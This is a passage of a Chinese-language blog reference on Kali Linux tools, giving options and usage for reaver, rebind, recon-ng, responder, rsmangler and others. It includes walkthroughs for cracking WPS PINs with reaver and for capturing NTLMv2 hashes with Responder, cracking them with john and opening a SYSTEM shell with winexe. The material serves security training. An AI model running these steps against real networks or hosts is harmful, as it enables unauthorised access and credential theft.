href="https://evilpan.com/2018/02/09/play-with-radare2/#%E7%9F%A5%E8%AF%86%E5%87%86%E5%A4%87">https://evilpan.com/2018/02/09/play-with-radare2/#%E7%9F%A5%E8%AF%86%E5%87%86%E5%A4%87</a></p><h2 id="reaver"><a href="#reaver" class="headerlink" title="reaver"></a>reaver</h2><h3 id="描述：-61"><a href="#描述：-61" class="headerlink" title="描述："></a>描述：</h3><p> Reaver对WiFi Protected Setup实施了暴力破解攻击，可以在几个小时内破解访问点的WPS引脚，随后恢复WPA &#x2F; WPA2密码。<br>  具体来说，Reaver的目标是WPS的注册服务商功能，该缺陷在于，只需花费11,000次尝试就可以猜出正确的WPS引脚，从而成为WPS的注册服务商。 一旦使用接入点注册为注册服务商，该接入点将为您提供WPA密码。</p><h3 id="参数：-46"><a href="#参数：-46" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">-m, --mac=&lt;mac&gt;<br>主机系统的MAC（应自动解决）<br><br>-e, --essid=&lt;ssid&gt;<br>目标AP的ESSID。 除非伪装，否则此问题将自动解决。<br><br>-c, --channel=&lt;channel&gt;<br>设置接口的802.11通道（表示-f）<br><br>-o, --out-file=&lt;file&gt;<br>将输出发送到日志文件[默认：stdout]<br><br>-f, --fixed<br>禁用频道跳变<br><br>-5, --5ghz<br>使用5GHz 802.11通道<br><br>-v, --verbose<br>显示非严重警告（更多信息请使用-vv）<br><br>-q,--quiet<br>仅显示重要消息<br><br>-i, --interface=&lt;wlan&gt;<br>要使用的监视方式接口的名称<br><br>-b, --bssid=&lt;mac&gt;<br>目标AP的BSSID<br><br>-p, --pin=&lt;wps pin&gt;<br>使用指定的WPS引脚<br><br>-h, --<span class="hljs-built_in">help</span><br>显示帮助信息<br></code></pre></td></tr></table></figure><h3 id="示例-5"><a href="#示例-5" class="headerlink" title="示例:"></a>示例:</h3><p>第一步， 把网步模式变成混杂模式:</p><p>第二步， 扫描一下附近的WIFI：</p><p>用命令:airodump-ng wlan0mon</p><p>上图中的MB那一列， 看到有像54e.这种形式的， 就说明可以用reaver破解(ping 码破解, 没有 “ . “号的， 说明没有开启wps)</p><p>wps就是下图这个:</p><p>这里有ping码， reaver就是用这个来破解的， 确保WIFI路由已开启。当然， 有些防ping的路由， 就算开启了， 不一定能破解， 但就目前， 90%都能破了。</p><p>第三步, 上图列出附近的WIFI后， 用reaver命令傻瓜式破解就行。<br><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="kali 下 reaver 工具破解wifi"><br>运行后如下所以:<br><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="kali 下 reaver 工具破解wifi"><br>当成功后， 如图所示：</p><p>这个时候， 把ping码记好， 如果某时候， 对面改了密码， 但没改ping的话，<br>我们用reaver会一下子得到密码：<br>reaver -i 网卡 -b WIFIMAC －p ping码 -vv</p><h2 id="rebind"><a href="#rebind" class="headerlink" title="rebind"></a>rebind</h2><h3 id="描述：-62"><a href="#描述：-62" class="headerlink" title="描述："></a>描述：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142154129.png" alt="image-20220414215447965"></p><h3 id="参数：-47"><a href="#参数：-47" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">-i &lt;interface&gt;<br>指定要绑定的网络接口<br><br>-d &lt;fqdn&gt;<br>指定您的注册域名<br><br>-u &lt;user&gt;<br>指定基本身份验证用户名[admin]<br><br>-a &lt;pass&gt;<br>指定基本认证密码[admin]<br><br>-r &lt;path&gt;<br>指定初始URL请求路径[/]<br><br>-t &lt;ip&gt;<br>指定目标IP地址的逗号分隔列表[客户端IP]<br><br>-n &lt;time&gt;<br>指定回调间隔（以毫秒为单位）[2000]<br><br>-p &lt;port&gt;<br>指定目标端口[80]<br><br>-c &lt;port&gt;<br>指定回调端口[81]<br><br>-C &lt;value&gt;<br>指定要为客户端设置的cookie<br><br>-H &lt;file&gt;<br>指定HTTP头文件供客户端发送到目标<br><br></code></pre></td></tr></table></figure><h2 id="recon-ng"><a href="#recon-ng" class="headerlink" title="recon-ng"></a>recon-ng</h2><h3 id="描述：-63"><a href="#描述：-63" class="headerlink" title="描述："></a>描述：</h3><p>何为 Recon-NG，主要用来对于目标的信息搜集，可以搜集哪些东西？ip 地址，子域名，子域名 ip，位置，邮件地址，用户，密码等。</p><h3 id="参数：-48"><a href="#参数：-48" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">[recon-ng][default] &gt; <span class="hljs-built_in">help</span><br><br>Commands (<span class="hljs-built_in">type</span> [<span class="hljs-built_in">help</span>|?] &lt;topic&gt;):<br>---------------------------------<br>add             将记录添加到数据库中<br>back            退出当前回话<br>delete          从数据库中删除记录<br><span class="hljs-built_in">exit</span>            退出框架<br><span class="hljs-built_in">help</span>            显示帮助<br>keys            管理框架API键<br>load            加载指定模块<br>pdb             打开 Python 的 Debug 回话<br>query           查询数据库<br>record          Records commands to a resource file<br>reload          重新加载所有模块<br>resource        Executes commands from a resource file<br>search          搜索可用的模块<br><span class="hljs-built_in">set</span>             设置模块的选择<br>shell           执行shell命令<br>show            显示各种框架项目<br>snapshots       管理工作区快照<br>spool           Spools output to a file<br><span class="hljs-built_in">unset</span>           附件模块选择<br>use             加载指定的模块<br>workspaces      管理工作区<br></code></pre></td></tr></table></figure><p>命令技巧：workspaces 然后双击tab会显示这个命令下可使用的参数。其他命令也行。</p><h3 id="创建工作区"><a href="#创建工作区" class="headerlink" title="创建工作区"></a>创建工作区</h3><p>Recon-ng -w 公司名  或者  workspaces add 公司名字</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142158347.png" alt="image-20220414215838172"></p><h3 id="添加keys"><a href="#添加keys" class="headerlink" title="添加keys"></a>添加keys</h3><p>有的模块需要使用网站的keys</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">keys  list    这个命令可以查看需要key的网站<br><br>keys   add   twitter_api   keys码<br></code></pre></td></tr></table></figure><p>上面添加keys</p><h3 id="搜索模块"><a href="#搜索模块" class="headerlink" title="搜索模块"></a>搜索模块</h3><p>加入要搜索和bing相关的模块</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">srarch  bing</span><br></code></pre></td></tr></table></figure><h3 id="数据保存"><a href="#数据保存" class="headerlink" title="数据保存"></a>数据保存</h3><p>每次run后数据都保存再一个表格中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">show hosts   可以查看查询结果<br></code></pre></td></tr></table></figure><p>set命令可以设置参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span>  SORCE query  select from hosts from select <span class="hljs-built_in">where</span> host like ‘%sina.com.cn%’<br></code></pre></td></tr></table></figure><p>上面是把模块的SORCE设置为select from hosts from select where host like ‘%<a href="http://sina.com.cn/">sina.com.cn</a>%’</p><h3 id="一个完整的流程"><a href="#一个完整的流程" class="headerlink" title="一个完整的流程"></a>一个完整的流程</h3><p>1.刚启动时我们会发现命令行前的符号为 default，也就是默认空间的意思，准备一个新的目标时建议新建一个工作空间，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">workspaces add 公司名字<br></code></pre></td></tr></table></figure><p>2.可以使用搜索引擎来搜索相关信息，以前搜索引擎有三个，分别是 google、baidu、bing。<br>baidu 模块下架了，那怎么办，使用 bing 即可，其命令如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">use recon/domains-hosts/bing_domain_web<br><span class="hljs-built_in">set</span> SOURCE  XXXX<br>run<br></code></pre></td></tr></table></figure><p>3.搜索后可进行暴力破解子域名，其模块是 recon&#x2F;domains-hosts&#x2F;brute_hosts, 其命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">use recon/domains-hosts/brute_hosts<br><span class="hljs-built_in">set</span> SOURCE  XXXX<br>run<br></code></pre></td></tr></table></figure><p>4.随后可使用 netcraft 查询域名，什么是 netcraft？它用来查询网站信息，例如服务器、web 服务器、机房等。怎么了解它呢，你可以直接访问官网 <a href="https://netcraft.com/">https://netcraft.com</a>，然后输入域名即可查询。这里的命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">use recon/domains-hosts/netcraft<br><span class="hljs-built_in">set</span> SOURCE  XXXX<br>run<br></code></pre></td></tr></table></figure><p>5.然后可以将所有的域名解析成 ip 地址，其命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">use recon/hosts-hosts/resolve<br><span class="hljs-built_in">set</span> SOURCE  XXXX<br>run<br></code></pre></td></tr></table></figure><p>6.接下来可以将所有的域名解析成主机名，其用到的模块是 recon&#x2F;hosts-hosts&#x2F;reverse_resolve，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">use recon/hosts-hosts/reverse_resolve<br><span class="hljs-built_in">set</span> SOURCE  XXXX<br>run<br></code></pre></td></tr></table></figure><p>7.这时可以去指定的域名中查找一些隐私文件，也就是泄露文件，何为泄露文件，例如 robots 文件、phpinfo 文件、xml 配置文件等等，有很多，具体的文件可以看命令的执行过程，其命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">use discovery/info_disclosure/interesting_files<br><span class="hljs-built_in">set</span> SOURCE  XXXX<br>run<br></code></pre></td></tr></table></figure><p>8.这时可以探测其 ip 的地址位置，用到的模块是 recon&#x2F;hosts-hosts&#x2F;ipinfodb，这里有一个坑需要注意下，你直接用是不行的，因为 ipinfodb 模块要依赖 ipinfodb 的 API 密钥，具体的获取方法和配置方法开头有记录，配置好后，执行以下命令即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">use recon/hosts-hosts/ipinfodb<br><span class="hljs-built_in">set</span> SOURCE  XXXX<br>run<br></code></pre></td></tr></table></figure><p>9.查询地址后可以再查询一下 whois 的邮件地址，用到的模块是 recon&#x2F;domains-contacts&#x2F;whois_pocs，其命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">use recon/domains-contacts/whois_pocs<br><span class="hljs-built_in">set</span> SOURCE  XXXX<br>run<br></code></pre></td></tr></table></figure><p>10.最后可以搜集一下公共的 PGP 存储中的邮件地址，什么是 PGP，它用来对邮件进行加密，执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">use recon/domains-contacts/pgp_search<br><span class="hljs-built_in">set</span> SOURCE  XXXX<br>run<br></code></pre></td></tr></table></figure><p>11.然后可以使用 hibp_paste 模块，什么是 hibp_paste，它可以根据你的邮件地址去搜索，看你的邮件密码有没有在某些地方泄露，想了解你可以访问官网：<a href="https://haveibeenpwned.com，这个只作为了解，对于国内测试来说，可以不使用这个模块，因为这个是针对国外的，咱们使用可能效果不太理想，可忽略。其命令如下：">https://haveibeenpwned.com，这个只作为了解，对于国内测试来说，可以不使用这个模块，因为这个是针对国外的，咱们使用可能效果不太理想，可忽略。其命令如下：</a></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">use recon<span class="hljs-regexp">/contacts-credentials/</span>hibp_paste<br>set <span class="hljs-keyword">SOURCE</span>  XXXX<br>run<br></code></pre></td></tr></table></figure><p>12.至此，可以用此流程来搜集一个目标网，然后将以上的搜集内容导出报告即可，以 html 格式为例，用到的模块是 reporting&#x2F;html，其命令如下：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> reporting/html<br></code></pre></td></tr></table></figure><p>创建报告后设置一下创建者名称，如下命令：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> CREATOR <span class="hljs-comment">xxx</span><br></code></pre></td></tr></table></figure><p>同时，也设置一下客户的名称，如下命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span><span class="hljs-built_in"> CUSTOMER </span>xxx<br></code></pre></td></tr></table></figure><p>最后执行 run 命令运行，会输出其报告的 html 文件地址，然后 exit 退出。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Recon-ng有侦查，发现，汇报，和攻击四大块（import没发现有多大的用处,所以暂时为四大块）,可用show modules查看有哪些模块。</p><h3 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h3><p>Profiler模块: 查询某个用户名在那些网站（知名）有注册。<br>可用 search profiler 查询在具体路径<br>使用模块:use recon&#x2F;profiles-profiles&#x2F;profiler<br>查看用法:show option 或者 info info更加详细<br>根据提示,需要设置SOURCE选项,用命令:set SOURCE cesign<br>然后运行:run<br>查看结果（根据提示更新了profiles表,查看表的命令为show 表名） show profiles</p><h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><p>Interesting_files模块:查找某网站的敏感文件<br>命令跟前面一样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Search interesting_files<br>Use discovery/info_disclosure/interesting_files<br>Show info  <span class="hljs-comment">#查看用法,可以看到参数比较多,含义我就不解释了</span><br></code></pre></td></tr></table></figure><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>command_injector模块：命令注入，多用于木马文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Search command_injector<br>Use path-to/command_injector<br>Show info <span class="hljs-comment">#可以看到具体的参数</span><br><span class="hljs-built_in">set</span> base_url http://172.16.227.128/other/a.php<br></code></pre></td></tr></table></figure><h3 id="报告"><a href="#报告" class="headerlink" title="报告"></a>报告</h3><p>Html模块:把运行的结果生成html文件</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142217242.png" alt="在这里插入图片描述"></p><h2 id="recordmydesktop"><a href="#recordmydesktop" class="headerlink" title="recordmydesktop"></a>recordmydesktop</h2><h3 id="描述：-64"><a href="#描述：-64" class="headerlink" title="描述："></a>描述：</h3><p>Gnome 前端会在程序运行的时候，在你的面板上添加一个图标，按下图标可以随时开始、结束录制。当开始录制的时候，RecordMyDesktop 会把你桌面上全部录下来（如果只截取一部分，下面说），录完后，可以以 Ogg Theora 格式保存到  &#x2F;home 目录。当然音频，声音也同样可以加入其中，或者只要按一下选择框就可以禁止。</p><h3 id="参数：-49"><a href="#参数：-49" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Select Window：可选取录屏界面的大小。<br>Record：开始录屏。<br>Advanced：更多高级设置。<br>Files：设置保存目录以及是否覆盖。<br>Performance：有录制视频质量的参数：<br>帧率：越高视频质量越好，但压缩事件更长 。<br>Encode on the Fly：未知。<br>零压缩：确保视频帧的质量。<br>快速亚采样：加快压缩速度，降低视频质量。<br>完整捕获每帧：确保视频帧的质量。<br><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142221404.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Sound：一般默认即可。<br>Misc：显示设置，注意Follow Mouse选项即可。<br>Save As：设置视频保存目录及名称。<br>Quit：直接退出软件。<br></code></pre></td></tr></table></figure><p>也在<code>Terminal</code>，直接输入命令运行<code>RecordMyDesktop</code>，但此时设置参数以默认为准，且关闭终端，会默认输出录屏视频于<code>/Home</code>目录下，文件格式为<code>out.ogv</code>。</p><p><code>ogv</code>格式的视频，可能不够常见，可以通过<code>FFmpeg</code>对其格式进行转换。</p><h2 id="responder"><a href="#responder" class="headerlink" title="responder"></a>responder</h2><h3 id="描述：-65"><a href="#描述：-65" class="headerlink" title="描述："></a>描述：</h3><p>这是一种不用通过漏洞利用来获取权限的一种方法，使用的是kali的一个工具，叫Responder，主要是通过监听网络，有人如果访问了虚假的共享文件地址，就会获得该系统登录口令的哈希值，然后再通过脚本进行hash爆破就可以获取口令，再通过ipc建立空连接获得系统权限</p><h3 id="参数：-50"><a href="#参数：-50" class="headerlink" title="参数："></a>参数：</h3><p>首先我们启动一个内网<a href="https://so.csdn.net/so/search?q=%E7%9B%91%E5%90%AC&spm=1001.2101.3001.7020">监听</a>（需要先cd到responder文件夹下）</p><h3 id="x2F-Responder-py-wf-I-eth0"><a href="#x2F-Responder-py-wf-I-eth0" class="headerlink" title=".&#x2F;Responder.py -wf -I eth0"></a>.&#x2F;Responder.py -wf -I eth0</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142225046.png" alt="在这里插入图片描述"></p><p>-wf 应该是设定web代理 -I 指定网卡，这里我指定的是eth0，我们可以通过ifconfig指令查看自己的ip以及网卡信息，具体怎么添加删除一个网卡这里不再赘述，scdn一搜一大堆</p><p>如下图，开始监听了。</p><p>然后我们在任何windows系统访问一下虚假的共享文件地址，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;******&gt;\\NOTAREALHOST\NOTARALSHARE\notarealfile.exe<br></code></pre></td></tr></table></figure><p>会出现拒绝访问<br>然后我们的监听端就会出现一些奇妙的信息。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142227517.png" alt="在这里插入图片描述"></p><p>没错，我们抓到了我们的登录口令<a href="https://so.csdn.net/so/search?q=hash&spm=1001.2101.3001.7020">hash</a><br>然后我们q退出，运行</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./DumpHash.py</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142228620.png" alt="在这里插入图片描述"></p><p>会把我们抓到的hash导出成john可以处理的格式</p><p>这里我们抓到了两个hash，一个是我本机的登录口令，一个是我的虚拟机windows server 2012R2的登录口令hash<br>我们的根目录会生成两个txt文件，分别存储的是两个版本的hash，具体是什么版本在我们上一步导出时已经明确指出，如上图：时NTLMV2版本<br>————————————————</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142228181.png" alt="在这里插入图片描述"></p><p>然后我们用我们的john进行指定版本hash爆破，爆破并不是百分百成功的。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">john </span>DumpNTLMv2.txt<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142229216.png" alt="在这里插入图片描述"></p><p>现在我们能做的只有等。。。</p><p>获取到口令之后我们能干的事情就太多了，看22端口开了嘛，开了直接ssh连接，或者还有更强的，验证目标系统上是否存在ipc共享，如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">smbclient -U <span class="hljs-selector-attr">[username]</span>%<span class="hljs-selector-attr">[password]</span> -L <span class="hljs-selector-attr">[ipaddress]</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142230745.png" alt="在这里插入图片描述">ok可以清楚的看到它开着，然后我们直接用<a href="https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020">kali</a>自带工具winexe拿shell</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">winexe -U <span class="hljs-selector-attr">[username]</span>%<span class="hljs-selector-attr">[password]</span> <span class="hljs-attr">--uninstall</span> \\<span class="hljs-selector-attr">[ipaddress]</span> cmd<span class="hljs-selector-class">.exe</span><br></code></pre></td></tr></table></figure><p>或者直接给他提升系统权限</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">winexe -U <span class="hljs-selector-attr">[username]</span>%<span class="hljs-selector-attr">[password]</span> <span class="hljs-attr">--uninstall</span> <span class="hljs-attr">--system</span> \\<span class="hljs-selector-attr">[ipaddress]</span> cmd<span class="hljs-selector-class">.exe</span><br><br></code></pre></td></tr></table></figure><p>注意一定要带参数–unistall </p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142233428.png" alt="img"></p><h2 id="Ristretto-图片查看器"><a href="#Ristretto-图片查看器" class="headerlink" title="Ristretto 图片查看器"></a>Ristretto 图片查看器</h2><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142233707.png" alt="image-20220414223355527"></p><h2 id="rsmangler"><a href="#rsmangler" class="headerlink" title="rsmangler"></a>rsmangler</h2><h3 id="描述：-66"><a href="#描述：-66" class="headerlink" title="描述："></a>描述：</h3><p>生成字典</p><h3 id="参数：-51"><a href="#参数：-51" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs bash">--<span class="hljs-built_in">help</span>, -h<br>显示帮助信息<br><br>--file, -f<br>输入文件，使用-表示STDIN<br><br>--output, -o<br>输出文件，使用-用于STDOUT<br><br>--max, -x<br>最大的字长<br><br>--min, -m<br>最小的字长<br><br>--perms, -p<br>排列所有的单词<br><br>--double, -d<br>每个单词加倍<br><br>--reverse, -r<br>扭转这个词<br><br>--leet, -t<br>l33t说出这个词<br><br>--full-leet, -T<br>所有的可能性<br><br>--capital, -c<br>大写这个词<br><br>--upper, -u<br>大写单词<br><br>--lower, -l<br>小写这个词<br><br>--swap, -s<br>交换单词的大小写<br><br>--ed, -e<br>在单词的末尾加上ed<br><br>--ing, -i<br>在单词末尾添加ing<br><br>--punctuation<br>在单词的末尾添加常见标点符号<br><br>--years, -y<br>将1990年到本年的所有年份相加，以开始和结束<br><br>--acronym, -a<br>根据顺序输入的所有单词创建首字母缩写词并添加到单词列表<br><br>--common, -C<br>添加以下单词以开始和结束：admin，sys，pw，<span class="hljs-built_in">pwd</span><br><br>--pna<br>在单词的末尾添加01-09<br><br>--pnb<br>在单词开头添加01-09<br><br>--na<br>在单词的末尾添加1-123<br><br>--nb<br>在单词的开头加上1-123<br><br>--force<br>不检查输出大小<br><br>--space<br>在单词之间添加空格<br><br>--allow-duplicates<br>在输出列表中允许重复<br><br></code></pre></td></tr></table></figure><h3 id="示例-6"><a href="#示例-6" class="headerlink" title="示例:"></a>示例:</h3><p>视频参考:</p><p><a href="https://www.bilibili.com/video/av415735576/">https://www.bilibili.com/video/av415735576/</a></p><h1 id="S"><a href="#S" class="headerlink" title="S"></a>S</h1><h2 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a>skipfish</h2><h3 id="描述：-67"><a href="#描述：-67" class="headerlink" title="描述："></a>描述：</h3><p>Skipfish是一款主动的Web应用程序安全侦察工具。它通过执行递归爬取和基于字典的探测来为目标站点准备交互式站点地图。最终的地图然后用来自许多活动（但希望是不中断的）安全检查的输出来注释。该工具生成的最终报告旨在作为专业Web应用程序安全评估的基础。</p><h3 id="参数：-52"><a href="#参数：-52" class="headerlink" 